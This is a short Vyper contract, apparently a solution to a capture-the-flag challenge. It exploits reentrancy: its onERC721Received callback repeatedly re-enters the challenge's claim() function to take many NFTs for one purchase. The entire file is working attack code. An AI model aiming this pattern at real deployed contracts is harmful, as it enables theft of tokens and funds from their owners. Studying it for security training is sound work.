# @version ^0.3.7

interface ChallengeInterface:
   def claim(): nonpayable
   def canClaim(sender: address) -> bool: view
   def balanceOf(owner: address) -> uint256: view

count: uint256
challenge: ChallengeInterface

@external
@payable
def __init__(challenge_address: address):
    self.challenge = ChallengeInterface(challenge_address)

@external
@payable
def attack():
    assert msg.value == as_wei_value(0.01, "ether"), "send 0.01 ether"
    # buy nft
    raw_call(
        self.challenge.address,
        method_id("buyNFT()"),
        value=msg.value,
    )
    assert self.challenge.canClaim(self), "!claim"
    # call claim
    self.challenge.claim()
    assert self.challenge.balanceOf(self) > 1, "!>1 NFT"

@external
def onERC721Received(
    operator: address,
    sender: address,
    tokenId: uint256,
    data: Bytes[32]
) -> bytes4:
    if self.count < 31:
        self.count += 1
        self.challenge.claim()
    selector: bytes4 = convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )
    return selector
